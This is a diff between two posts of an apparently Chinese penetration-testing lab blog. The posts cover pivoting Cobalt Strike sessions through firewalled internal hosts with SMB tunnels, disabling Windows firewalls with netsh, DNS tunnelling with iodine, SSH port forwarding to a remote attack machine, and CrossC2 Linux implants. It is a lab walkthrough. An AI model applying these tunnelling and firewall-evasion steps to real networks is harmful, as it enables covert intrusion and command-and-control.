@@ -11,7 +11,7 @@
   
   <title>
     
-      多层内网不出网绕过防火墙SMB隧道&amp;转发上线 
+      内网隧道技术&amp;Linux上线 
       
       
       |
@@ -155,11 +155,11 @@
   <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
   <div class="container post-details" id="post-details">
     <div class="post-content">
-      <div class="post-title">多层内网不出网绕过防火墙SMB隧道&转发上线</div>
+      <div class="post-title">内网隧道技术&Linux上线</div>
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
-          2022-09-19 00:00:00
+          2022-09-23 00:00:00
         </span>
         
               <span class="post-categories">
@@ -186,27 +186,57 @@
           
       </div>
       <div class="markdown-body">
-        <h1 id="多层内网不出网绕过防火墙SMB隧道-amp-转发上线"><a href="#多层内网不出网绕过防火墙SMB隧道-amp-转发上线" class="headerlink" title="多层内网不出网绕过防火墙SMB隧道&amp;转发上线"></a>多层内网不出网绕过防火墙SMB隧道&amp;转发上线</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><img src="/posts/59813d6f/QfozOFxpvTuyPpTabJC3MA.png" alt="QfozOFxpvTuyPpTabJC3MA"></p>
-<p>各个系统的网卡配置见上篇文章，区别就是Server2008和Server2012的防火墙</p>
-<p>Server2008<br><img src="/posts/59813d6f/image-20220918235727419.png" alt="image-20220918235727419"></p>
-<p>Server2012<br><img src="/posts/59813d6f/image-20220918235956279.png" alt="image-20220918235956279"></p>
-<h2 id="Win7-amp-Win10上线"><a href="#Win7-amp-Win10上线" class="headerlink" title="Win7&amp;Win10上线"></a>Win7&amp;Win10上线</h2><p>这两个主机的上线方式和上篇文章相同，先拿到win7shell然后正向链接win10，详情可以看上篇文章<br><img src="/posts/59813d6f/image-20220919091420122.png" alt="image-20220919091420122"></p>
-<h2 id="Server2008上线-转发"><a href="#Server2008上线-转发" class="headerlink" title="Server2008上线-转发"></a>Server2008上线-转发</h2><p>这里和上篇文章不同的是多了一个防火墙只让访问web服务也就是只有80端口,那么以前的正向链接思路也就行不通了，因为只可以访问80端口可以访问，如果创建一个80的木马又和web服务有冲突。<br>所以要想拿下Server2008就要使用反向拦截将数据发送给win10然后再转发给攻击机，但是直接建立192.168.22.130监听的马win10并不会转到我们的攻击机<br>所以Win10建立一个转发上线监听器<br><img src="/posts/59813d6f/image-20220919130210004.png" alt="image-20220919130210004"><br><img src="/posts/59813d6f/image-20220919130613533.png" alt="image-20220919130613533"><br>然后创建该监听器的马<br><img src="/posts/59813d6f/image-20220919131055422.png" alt="image-20220919131055422"><br>server2008执行上线<br><img src="/posts/59813d6f/image-20220919131155812.png" alt="image-20220919131155812"><br>看一下拓扑视图<br><img src="/posts/59813d6f/image-20220919131325903.png" alt="image-20220919131325903"><br>可以看到Server2008将数据转到Win10达成上线</p>
-<h2 id="Server2012上线-smb隧道"><a href="#Server2012上线-smb隧道" class="headerlink" title="Server2012上线-smb隧道"></a>Server2012上线-smb隧道</h2><p>这里又有一个坑,如果继续使用反向链接去链接Server2008那么就触发了2008的入站规则直接gg,但同时他又有入站规则正向连接也gg,那就没办法上线了么,当然是有方法的就是通过smb隧道进行通讯<br><strong>什么是smb</strong><br>smb是一种协议名，smb服务的作用在于计算机间共享文件、打印机和串口等。<br>CS建立smb监听器<br><img src="/posts/59813d6f/image-20220919151313190.png" alt="image-20220919151313190"><br>注意smb监听器不能生成木马应为他并没有目标地址和端口,而是建立smb隧道,让后借助横向移动的方法达到上线<br>先借助2008对内网进行扫描<br><img src="/posts/59813d6f/image-20220919151850690.png" alt="image-20220919151850690"><br><img src="/posts/59813d6f/image-20220919151906193.png" alt="image-20220919151906193"></p>
-<p>扫描完整后到目标列表进行横向移动<br><img src="/posts/59813d6f/image-20220919185045712.png" alt="image-20220919185045712"><br>输入主机密码（可通过前期信息搜集获得，见以前文章)<br>监听器选择之前创建的smb<br>会话选择Server2008<br><img src="/posts/59813d6f/image-20220919190150560.png" alt="image-20220919190150560"><br>成功上线</p>
-<h3 id="其他上线方法"><a href="#其他上线方法" class="headerlink" title="其他上线方法"></a>其他上线方法</h3><p>我们已经拿到了Server2008的shell可以通过shell把命令关了</p>
-<p>Windows防火墙命令：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tomtellyou/p/16300557.html">https://www.cnblogs.com/tomtellyou/p/16300557.html</a></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看当前防火墙状态：</span></span><br><span class="line">netsh advfirewall show allprofiles</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关闭防火墙：</span></span><br><span class="line">netsh advfirewall set allprofiles state off</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">开启防火墙：</span></span><br><span class="line">netsh advfirewall set allprofiles state on</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">恢复初始防火墙设置：</span></span><br><span class="line">netsh advfirewall reset</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启用桌面防火墙:</span> </span><br><span class="line">netsh advfirewall set allprofiles state on</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置默认输入和输出策略：</span></span><br><span class="line">netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果设置为拒绝使用blockinbound,blockoutbound</span></span><br></pre></td></tr></table></figure>
+        <h1 id="内网隧道技术-amp-Linux上线"><a href="#内网隧道技术-amp-Linux上线" class="headerlink" title="内网隧道技术&amp;Linux上线"></a>内网隧道技术&amp;Linux上线</h1><p>ICMP和SMB隧道在前面文章中已经实现</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><img src="/posts/2cb05a91/A0zT3eux7IjxM1ELmIIAyg.png" alt="img"></p>
+<p>windows服务器设置防火墙出站策略<br><img src="/posts/2cb05a91/image-20220922190239113.png" alt="image-20220922190239113"><br><img src="/posts/2cb05a91/image-20220922190257504.png" alt="image-20220922190257504"><br><img src="/posts/2cb05a91/image-20220922190314617.png" alt="image-20220922190314617"></p>
+<p><img src="/posts/2cb05a91/Jv0uYt6ULlyZLAoBbdgBsg.png" alt="img"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">iptables -F #清除所有规则</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT #允许包从22端口进入</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT #允许从22端口进入的包返回</span><br><span class="line">iptables -A OUTPUT -p udp --dport 53 -j ACCEPT #域名解析端口，一般不开</span><br><span class="line">iptables -A INPUT -p udp --sport 53 -j ACCEPT #域名解析端口，一般不开</span><br><span class="line">iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT #允许本机访问本机</span><br><span class="line">iptables -A OUTPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp -s 0/0 --dport 80 -j ACCEPT #允许所有IP访问80端口</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables-save &gt; /etc/sysconfig/iptables #保存配置</span><br><span class="line">iptables -L #显示iptables列表</span><br></pre></td></tr></table></figure>
 
-<p>注意cs执行shell命令必须在会话交互窗口输入shell 然后再加执行的命令<br>关闭防火墙<br><img src="/posts/59813d6f/image-20220919224422050.png" alt="image-20220919224422050"><br>再以Server2008创建一个转发上线监听器<br><img src="/posts/59813d6f/image-20220919224827880.png" alt="image-20220919224827880"><br>创建该监听器的木马传到Server2012执行<br><img src="/posts/59813d6f/image-20220919225001754.png" alt="image-20220919225001754"><br>再次上线<br><img src="/posts/59813d6f/image-20220919225052334.png" alt="image-20220919225052334"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>进行内网渗透是要根据防火墙的规则来选择上线方式,可以先测试可以利用了那些协议icmp，tcp，smb等等<br>如果防火墙规则无法关闭是否可以通过关闭其中一个主机的防火墙来达到上线效果<br>但是关闭防火墙这种方法单纯的内网环境如果是域策略同步这种那么这种方法将失效</p>
+<p>开启ssh协议登录：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">PasswordAuthentication yes</span><br><span class="line">/etc/init.d/ssh start</span><br><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure>
+
+<h2 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h2><p><strong>DNS在区域传输为TCP协议 在域名解析时为UDP协议</strong></p>
+<p>判断：**windows:**nslookup<br>     **Linux:**dig<br><img src="/posts/2cb05a91/image-20220922190755393.png" alt="image-20220922190755393"><br>有回显说明可以使用dns协议</p>
+<h3 id="1、上线环境"><a href="#1、上线环境" class="headerlink" title="1、上线环境"></a>1、上线环境</h3><p>内网主机只出网DNS协议数据，解决上线</p>
+<p><strong>域名申请及配置</strong></p>
+<p>先创建一个A记录类型记录值为cs服务端地址</p>
+<p><img src="/posts/2cb05a91/image-20220922191723157.png" alt="image-20220922191723157"><br>然后创建NS记录类型记录值为创建的A型域名<img src="/posts/2cb05a91/image-20220922191705097.png" alt="image-20220922191705097"><br>当解析时ns1.fattyy.top会解析为cs.fattyy.top而cs.fattyy.top会解析为cs服务端地址</p>
+<p><strong>监听器创建及配置</strong><br><img src="/posts/2cb05a91/image-20220922192958843.png" alt="image-20220922192958843"></p>
+<p><strong>后门绑定监听器及生成</strong></p>
+<p><img src="/posts/2cb05a91/image-20220922193108067.png" alt="image-20220922193108067"><br>运行木马<br><img src="/posts/2cb05a91/image-20220922223045482.png" alt="image-20220922223045482"><br>上线一个黑框<br>会话交互输入checkin<br><img src="/posts/2cb05a91/image-20220922223425217.png" alt="image-20220922223425217"></p>
+<h3 id="2、通讯环境"><a href="#2、通讯环境" class="headerlink" title="2、通讯环境"></a>2、通讯环境</h3><p>内网主机只出网DNS协议数据，解决通讯，但有点鸡肋需要在目标机执行命令……</p>
+<p>项目:<a target="_blank" rel="noopener" href="https://github.com/yarrick/iodine">https://github.com/yarrick/iodine</a></p>
+<p><strong>服务器：</strong>设置密码test并创建虚拟IP及绑定域名指向</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iodined -f -c -P test 192.168.0.1 ns1.fattyy.top -DD</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/2cb05a91/image-20220923083523457.png" alt="image-20220923083523457"><br><img src="/posts/2cb05a91/image-20220923083542470.png" alt="image-20220923083542470"><br>可以看到多出来一个192.168.0.1的网卡</p>
+<p><strong>客户端：</strong>连接密码test并绑定域名指向</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iodine -f -M 200 -P test ns1.fattyy.top</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/2cb05a91/image-20220923083824757.png" alt="image-20220923083824757"><br><img src="/posts/2cb05a91/image-20220923083859004.png" alt="image-20220923083859004"></p>
+<p>服务端尝试通讯尝试连接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.0.4</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/2cb05a91/image-20220923084159924.png" alt="image-20220923084159924"><br>成功通讯</p>
+<h2 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h2><p>由于SSH协议存在于Linux系统，跳板机必须Linux</p>
+<p>**条件:**需要取得一个root权限的linux系统<br>由于CS无SSH协议监听器配置，无法上线</p>
+<p>本地：出站协议被封</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将目标机:80端口流量转发到跳板机:1122</span></span><br><span class="line">ssh -CfNg -L 1122:192.168.1.15:80 root@192.168.1.166</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">跳板机接收流量</span></span><br><span class="line">curl http://127.0.0.1:1122</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/2cb05a91/image-20220923091654829.png" alt="image-20220923091654829"><br>需要输入跳板机密码<br><img src="/posts/2cb05a91/image-20220923092027085.png" alt="image-20220923092027085"></p>
+<p>远程：入站协议被封</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将目标机:80端口流量转发到远程攻击机:1234</span></span><br><span class="line">ssh -CfNg -R 1234:192.168.1.15:80 root@47.94.236.117</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">远程攻击机接受流量</span></span><br><span class="line">curl http://127.0.0.1:1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/2cb05a91/image-20220923092318305.png" alt="image-20220923092318305"></p>
+<h2 id="CrossC2-Linux上线"><a href="#CrossC2-Linux上线" class="headerlink" title="CrossC2-Linux上线"></a>CrossC2-Linux上线</h2><p>项目地址:<a target="_blank" rel="noopener" href="https://github.com/gloxec/CrossC2">https://github.com/gloxec/CrossC2</a><br>使用参考:<a target="_blank" rel="noopener" href="https://gloxec.github.io/CrossC2/zh_cn/">https://gloxec.github.io/CrossC2/zh_cn/</a><br>搭建参考:<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42742658/article/details/122844041">https://blog.csdn.net/weixin_42742658/article/details/122844041</a></p>
+<p>面向Linux Mac IOS Android系统上线支持<br>1、插件使用<br>cs加载三个cna文件<br><img src="/posts/2cb05a91/image-20220923152252183.png" alt="image-20220923152252183"><br>修改CrossCut-githubbot.cna文件<br><img src="/posts/2cb05a91/image-20220923195431436.png" alt="image-20220923195431436"><br><code>$CC2_PATH</code>为genCrossC2.Linux的路径<br><code>$CC2_BIN</code>生成linux木马就选择genCrossC2.Linux mac木马就选genCrossC2.mac<br>生成后门<br><img src="/posts/2cb05a91/image-20220923152347027.png" alt="image-20220923152347027"><br><img src="/posts/2cb05a91/image-20220923192133726.png" alt="image-20220923192133726"><br><img src="/posts/2cb05a91/image-20220923193715577.png" alt="image-20220923193715577"><br>将命令复制到服务器上执行即可生成木马<br>给执行权限然后运行上线<br><img src="/posts/2cb05a91/image-20220923192010159.png" alt="image-20220923192010159"><br><img src="/posts/2cb05a91/image-20220923234755158.png" alt="image-20220923234755158"></p>
 
       </div>
       
         <div class="prev-or-next">
           <div class="post-foot-next">
             
-              <a href="/posts/c4250965/" target="_self">
+              <a href="/posts/59813d6f/" target="_self">
                 <i class="iconfont icon-chevronleft"></i>
                 <span>上一页</span>
               </a>
@@ -215,7 +245,7 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
-              2022-09-19 00:00:00
+              2022-09-23 00:00:00
             </span>
             
                   <span class="post-categories">
@@ -243,11 +273,6 @@
           </div>
           <div class="post-foot-prev">
             
-              <a href="/posts/2cb05a91/" target="_self">
-                <span>下一页</span>
-                <i class="iconfont icon-chevronright"></i>
-              </a>
-            
           </div>
         </div>
       
@@ -260,7 +285,7 @@
     <div class="title">目录</div>
     <div class="catalog-content">
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E4%B8%8D%E5%87%BA%E7%BD%91%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99SMB%E9%9A%A7%E9%81%93-amp-%E8%BD%AC%E5%8F%91%E4%B8%8A%E7%BA%BF"><span class="toc-text">多层内网不出网绕过防火墙SMB隧道&amp;转发上线</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Win7-amp-Win10%E4%B8%8A%E7%BA%BF"><span class="toc-text">Win7&amp;Win10上线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Server2008%E4%B8%8A%E7%BA%BF-%E8%BD%AC%E5%8F%91"><span class="toc-text">Server2008上线-转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Server2012%E4%B8%8A%E7%BA%BF-smb%E9%9A%A7%E9%81%93"><span class="toc-text">Server2012上线-smb隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E4%B8%8A%E7%BA%BF%E6%96%B9%E6%B3%95"><span class="toc-text">其他上线方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF-amp-Linux%E4%B8%8A%E7%BA%BF"><span class="toc-text">内网隧道技术&amp;Linux上线</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS%E9%9A%A7%E9%81%93"><span class="toc-text">DNS隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E4%B8%8A%E7%BA%BF%E7%8E%AF%E5%A2%83"><span class="toc-text">1、上线环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E9%80%9A%E8%AE%AF%E7%8E%AF%E5%A2%83"><span class="toc-text">2、通讯环境</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH%E9%9A%A7%E9%81%93"><span class="toc-text">SSH隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CrossC2-Linux%E4%B8%8A%E7%BA%BF"><span class="toc-text">CrossC2-Linux上线</span></a></li></ol></li></ol>
       
     </div>
   </div>
@@ -546,12 +571,12 @@
       </a>
       <div class="share-content hidden">
         
-          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E4%B8%8D%E5%87%BA%E7%BD%91%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99SMB%E9%9A%A7%E9%81%93%26%E8%BD%AC%E5%8F%91%E4%B8%8A%E7%BA%BF + '&url=' + http%3A%2F%2Fexample.com%2Fposts%2F59813d6f%2F + '" target="_blank" title="Twitter">
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%26Linux%E4%B8%8A%E7%BA%BF + '&url=' + http%3A%2F%2Fexample.com%2Fposts%2F2cb05a91%2F + '" target="_blank" title="Twitter">
             <i class="iconfont icon-twitter"></i>
           </a>
         
         
-          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/posts/59813d6f/" target="_blank" title="Facebook">
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/posts/2cb05a91/" target="_blank" title="Facebook">
             <i class="iconfont icon-facebooksquare"></i>
           </a>
         
